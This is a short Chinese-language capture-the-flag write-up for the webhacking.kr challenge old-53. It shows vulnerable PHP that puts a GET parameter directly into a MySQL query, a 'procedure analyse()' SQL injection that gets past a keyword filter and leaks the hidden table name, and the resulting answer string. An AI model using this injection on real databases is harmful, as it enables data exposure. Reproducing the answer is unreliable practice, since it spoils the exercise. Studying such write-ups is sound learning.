# old-53_350

* 這一題一進去只看到 source code 
    ```php=
    $db = dbconnect();
  include "./tablename.php";
  if($_GET['answer'] == $hidden_table) solve(53);
  if(preg_match("/select|by/i",$_GET['val'])) exit("no hack");
  $result = mysqli_fetch_array(mysqli_query($db,"select a from $hidden_table where a={$_GET['val']}"));
  echo($result[0]);
    ```
* 看了一下程式碼，只要找到 table name 就可以過了
* 但是因為禁用 select 所以沒辦法用 union 相關的 payload
* 所以在查看了相關的 cheat sheet 尋找靈感時，我看到了一個非常眼熟的東東 
    `procedure analyse()`
* 這是[官方文件](https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html)，簡單來說，這一題是直接輸出結果給我們，所以要找一個方法讓 result 吐出資料庫的結構，進而知道 hidden_table
* `?val=1%20procedure%20analyse()` 之後可以看到 `webhacking.chall53_755fdeb36d873dfdeb2b34487d50a805.a` 中間的就是 hidden_table 了
* 輸入 `?answer=chall53_755fdeb36d873dfdeb2b34487d50a805` 就可以過了

